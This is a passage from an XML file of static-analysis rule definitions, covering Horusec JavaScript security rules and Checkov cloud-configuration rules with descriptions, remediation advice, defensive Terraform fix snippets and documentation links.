      <![CDATA[Clickjacking attacks occur when an attacker try to trick an user to click on certain buttons/links of a legit website. This attack can take place with malicious HTML frames well hidden in an attacker website. Implement content security policy frame-ancestors directive which is supported by all modern browsers and will specify the origins of frame allowed to be loaded by the browser (this directive deprecates X-Frame-Options). For more information check out the OWASP A6:2017 (https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-content-security-policy-frame-ancestors-directive' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-content-security-policy-frame-ancestors-directive</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-content-security-policy-frame-ancestors-directive' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-44</key>
    <name>Allowing mixed-content</name>
    <description>
      <![CDATA[A mixed-content is when a resource is loaded with the HTTP protocol, from a website accessed with the HTTPs protocol, thus mixed-content are not encrypted and exposed to MITM attacks and could break the entire level of protection that was desired by implementing encryption with the HTTPs protocol. Implement content security policy block-all-mixed-content directive which is supported by all modern browsers and will block loading of mixed-contents. For more information check out the OWASP A3:2017 (https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-mixed-content' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-mixed-content</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-mixed-content' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html' target='_blank'>https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-45</key>
    <name>Disabling content security policy fetch directives</name>
    <description>
      <![CDATA[Content security policy (CSP) (fetch directives) is a W3C standard which is used by a server to specify, via a http header, the origins from where the browser is allowed to load resources. It can help to mitigate the risk of cross site scripting (XSS) attacks and reduce privileges used by an application. If the website doesn&#8217;t define CSP header the browser will apply same-origin policy by default. Implement content security policy fetch directives, in particular default-src directive and continue to properly sanitize and validate all inputs of the application, indeed CSP fetch directives is only a tool to reduce the impact of cross site scripting attacks. For more information check out the OWASP A6:2017 (https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-content-security-policy-fetch-directives' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-content-security-policy-fetch-directives</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-content-security-policy-fetch-directives' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-46</key>
    <name>Creating cookies without the "HttpOnly" flag</name>
    <description>
      <![CDATA[When a cookie is configured with the HttpOnly attribute set to true, the browser guaranties that no client-side script will be able to read it. In most cases, when a cookie is created, the default value of HttpOnly is false and it&#8217;s up to the developer to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target the theft of session-cookies, the HttpOnly attribute can help to reduce their impact as it won&#8217;t be possible to exploit the XSS vulnerability to steal session-cookies. By default the HttpOnly flag should be set to true for most of the cookies and it&#8217;s mandatory for session / sensitive-security cookies. For more information check out the OWASP A7:2017 (https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#creating-cookies-without-the-httponly-flag' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#creating-cookies-without-the-httponly-flag</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#creating-cookies-without-the-httponly-flag' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-47</key>
    <name>Creating cookies without the "secure" flag</name>
    <description>
      <![CDATA[When a cookie is protected with the secure attribute set to true it will not be send by the browser over an unencrypted HTTP request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack. It is recommended to use HTTPs everywhere so setting the secure flag to true should be the default behaviour when creating cookies. For more information check out the OWASP A3:2017 (https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#creating-cookies-without-the-secure-flag' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#creating-cookies-without-the-secure-flag</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#creating-cookies-without-the-secure-flag' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-48</key>
    <name>No use socket manually</name>
    <description>
      <![CDATA[Sockets are vulnerable in multiple ways: They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive sensitive information or inject dangerous input.The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols For more information check out the CWE-20 (https://cwe.mitre.org/data/definitions/20.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-socket-manually' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-socket-manually</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-socket-manually' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/20.html' target='_blank'>https://cwe.mitre.org/data/definitions/20.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-49</key>
    <name>Encryption Algorithms Weak</name>
    <description>
      <![CDATA[The perform secure cryptography, operation modes and padding scheme are essentials and should be used correctly according to the encryption algorithm:For block cipher encryption algorithms (like AES), the GCM (Galois Counter Mode) mode that works internally with zero/no padding scheme, is recommended. At the opposite, these modes and/or schemes are highly discouraged:Electronic Codebook (ECB) mode is vulnerable because it doesn&#8217;t provide serious message confidentiality: under a given key any given plaintext block always gets encrypted to the same ciphertext block.Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is vulnerable to padding oracle attacks.RSA encryption algorithm should be used with the recommended padding scheme (OAEP). More specifically for block cipher, it&#8217;s not recommended to use algorithm with a block size inferior than 128 bits. For more information check out the CWE-327 (https://cwe.mitre.org/data/definitions/327.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#encryption-algorithms-weak' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#encryption-algorithms-weak</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#encryption-algorithms-weak' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/327.html' target='_blank'>https://cwe.mitre.org/data/definitions/327.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-50</key>
    <name>File uploads should be restricted</name>
    <description>
      <![CDATA[These minimum restrictions should be applied when handling file uploads: the file upload folder to restrict untrusted files to a specific folder. the file extension of the uploaded file to prevent remote code execution. Also the size of the uploaded file should be limited to prevent denial of service attacks. For more information check out the CWE-434 (https://cwe.mitre.org/data/definitions/434.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#file-uploads-should-be-restricted' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#file-uploads-should-be-restricted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#file-uploads-should-be-restricted' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/434.html' target='_blank'>https://cwe.mitre.org/data/definitions/434.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-51</key>
    <name>Allowing requests with excessive content length is security-sensitive</name>
    <description>
      <![CDATA[Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in order to prevents DoS attacks, In your multer by default is no limit and maximum accept in Formidable and multer is 8mb. Ask Yourself Whether: Size limits are not defined for the different resources of the web application? The web application is not protected by rate limiting features? The web application infrastructure has limited resources? There is a risk if you answered yes to any of those questions. For more information check out the CWE-770 (https://cwe.mitre.org/data/definitions/770.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-requests-with-excessive-content-length-is-security-sensitive' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-requests-with-excessive-content-length-is-security-sensitive</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-requests-with-excessive-content-length-is-security-sensitive' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/770.html' target='_blank'>https://cwe.mitre.org/data/definitions/770.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-52</key>
    <name>No Disable Sanitize Html</name>
    <description>
      <![CDATA[To reduce the risk of cross-site scripting attacks, templating systems, such as Twig, Django, Smarty, Groovy&#8217;s template engine, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters that make sense to the browser (eg: <a>) will be transformed/replaced with escaped/sanitized values (eg: & lt;a& gt; ). Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right one. For more information check out the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-disable-sanitize-html' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-disable-sanitize-html</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-disable-sanitize-html' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-53</key>
    <name>SQL Injection</name>
    <description>
      <![CDATA[SQL queries often need to use a hardcoded SQL string with a dynamic parameter coming from a user request. Formatting a string to add those parameters to the request is a bad practice as it can result in an SQL injection. The safe way to add parameters to a SQL query is to use SQL binding mechanisms. For more information check out the CWE-564 (https://cwe.mitre.org/data/definitions/564.html) and OWASP A1:2017 (https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#sql-injection' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#sql-injection</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#sql-injection' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/564.html' target='_blank'>https://cwe.mitre.org/data/definitions/564.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_132</key>
    <name>Ensure KMS has a rotation policy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rotation-for-customer-created-cmks-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rotation-for-customer-created-cm-ks-is-disabled"></div>Rotation for customer created CMKs is disabled</div><a aria-label="Skip link to Rotation for customer created CMKs is disabled" class="heading-anchor-icon fa fa-anchor" href="#rotation-for-customer-created-cmks-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS Key Management Service (KMS) allows customers to rotate the backing key which is key material stored within the KMS which is tied to the key ID of the Customer Created customer master key (CMK). It is the backing key that is used to perform cryptographic operations such as encryption and decryption. Automated key rotation currently retains all prior backing keys so that decryption of encrypted data can take place transparently. It is recommended that CMK key rotation be enabled.<br/>
Rotating encryption keys helps reduce the potential impact of a compromised key as data encrypted with a new key cannot be accessed with a previous key that may have been exposed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_kms_key</li>
<li><strong>Argument:</strong>  enable_key_rotation</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_kms_key" "example" {                    
  name                = "example"
+ enable_key_rotation = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-kms-have-rotation-policy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-kms-have-rotation-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-kms-have-rotation-policy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_53</key>
    <name>Ensure 'public network access enabled' is set to False for mySQL servers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="public-network-access-enabled-is-not-set-to-false-for-mysql-servers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-public-network-access-enabled-is-not-set-to-false-for-my-sql-servers"></div>public network access enabled' is not set to 'False' for mySQL servers</div><a aria-label="Skip link to public network access enabled' is not set to 'False' for mySQL servers" class="heading-anchor-icon fa fa-anchor" href="#public-network-access-enabled-is-not-set-to-false-for-mysql-servers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_mysql_server</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mysql_server" "examplea" {
  ...
+ public_network_access_enabled = false
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-public-network-access-enabled-is-set-to-false-for-mysql-servers' target='_blank'> https://docs.bridgecrew.io/docs/ensure-public-network-access-enabled-is-set-to-false-for-mysql-servers</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-public-network-access-enabled-is-set-to-false-for-mysql-servers' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_90</key>
    <name>Ensure My SQL server disables public network access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="my-sql-server-enables-public-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-my-sql-server-enables-public-network-access"></div>My SQL server enables public network access</div><a aria-label="Skip link to My SQL server enables public network access" class="heading-anchor-icon fa fa-anchor" href="#my-sql-server-enables-public-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_mysql_server</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mysql_server" "example" {
              ...
 +            public_network_access_enabled     = false
              ...
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-mysql-server-disables-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-mysql-server-disables-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-mysql-server-disables-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_46</key>
    <name>Ensure a retention period of less than 90 days is specified</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="a-retention-period-of-less-than-90-days-is-not-specified"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-a-retention-period-of-less-than-90-days-is-not-specified"></div>A retention period of less than 90 days is not specified</div><a aria-label="Skip link to A retention period of less than 90 days is not specified" class="heading-anchor-icon fa fa-anchor" href="#a-retention-period-of-less-than-90-days-is-not-specified"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Audit Logs can help you find suspicious events, unusual activity, and trends. Auditing the SQL server, at the server-level, allows you to track all existing and newly created databases on the instance. This policy identifies SQL servers which do not retain audit logs for more than 90 days. As a best practice, configure the audit logs retention time period to be greater than 90 days</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<ol>
<li>Log in to the Azure Portal.</li>
<li>Select 'SQL servers'.</li>
<li>Select the SQL server instance you want to modify.</li>
<li>Select 'Auditing', and verify that 'Auditing' is 'On'.</li>
<li>Select 'Storage Details' and select the 'Storage account' in which to save the logs.</li>
<li>Set the 'Retention (days)' to 0 (indefinite) or greater than 90 days.</li>
<li>Select 'OK' and 'Save' your changes."</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>Resource: azurerm_mssql_database_extended_auditing_policy<br/>
Attribute: retention_in_days</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mssql_database_extended_auditing_policy" "example" {
  ...
  retention_in_days                       = 95 # any value above ninety 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_12' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_12</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_12' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_151</key>
    <name>Ensure Kubernetes secrets are encrypted using CMKs managed in AWS KMS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="unencrypted-kubernetes-secrets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-unencrypted-kubernetes-secrets"></div>Unencrypted Kubernetes secrets</div><a aria-label="Skip link to Unencrypted Kubernetes secrets" class="heading-anchor-icon fa fa-anchor" href="#unencrypted-kubernetes-secrets"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Kubernetes can store secrets that pods can access via a mounted volume. Currently, Kubernetes secrets are stored with Base64 encoding, but encrypting is the recommended approach. Amazon EKS clusters version 1.13 and higher support the capability of encrypting your Kubernetes secrets using AWS Key Management Service (KMS) Customer Managed Keys (CMK). The only requirement is to enable the encryption provider support during EKS cluster creation.<br/>
Use AWS Key Management Service (KMS) keys to provide envelope encryption of Kubernetes secrets stored in Amazon EKS. Implementing envelope encryption is considered a security best practice for applications that store sensitive data and is part of a defense in depth security strategy.<br/>
Application-layer Secrets Encryption provides an additional layer of security for sensitive data, such as user defined Secrets and Secrets required for the operation of the cluster, such as service account keys, which are all stored in etcd.<br/>
Using this functionality, you can use a key, that you manage in AWS KMS, to encrypt data at the application layer. This protects against attackers in the event that they manage to gain access to etcd.<br/>
We recommend that you encrypt Kubernetes secrets, stored in etcd, using the secrets encryption feature during Amazon EKS cluster creation.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_eks_cluster</li>
<li><strong>Argument</strong>: encryption_config/provider/key_arn</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_eks_cluster" "test" {
  name     = "example"
  ...
  encryption_config {
    resources = ["secrets"]
  +  provider {
  +    key_arn = "test"
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-kubernetes-secrets-are-encrypted-using-customer-master-keys-cmks-managed-in-aws-kms' target='_blank'> https://docs.bridgecrew.io/docs/ensure-kubernetes-secrets-are-encrypted-using-customer-master-keys-cmks-managed-in-aws-kms</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-kubernetes-secrets-are-encrypted-using-customer-master-keys-cmks-managed-in-aws-kms' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_17</key>
    <name>Ensure AWS EC2 instance is configured with VPC</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ec2-instance-is-not-configured-with-vpc"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ec-2-instance-is-not-configured-with-vpc"></div>AWS EC2 instance is not configured with VPC</div><a aria-label="Skip link to AWS EC2 instance is not configured with VPC" class="heading-anchor-icon fa fa-anchor" href="#aws-ec2-instance-is-not-configured-with-vpc"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Using the EC2-VPC platform for launching your EC2 instances  instead of EC2-Classic can bring several advantages:<br/>
Better networking infrastructure (network isolation, Elastic Network Interfaces, subnets)<br/>
More flexible security controls (network ACLs, security groups outbound/egress filtering)<br/>
Access to newer and powerful instance types (C4, M4, T2, etc)<br/>
Capability to run instances on single-tenant hardware</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
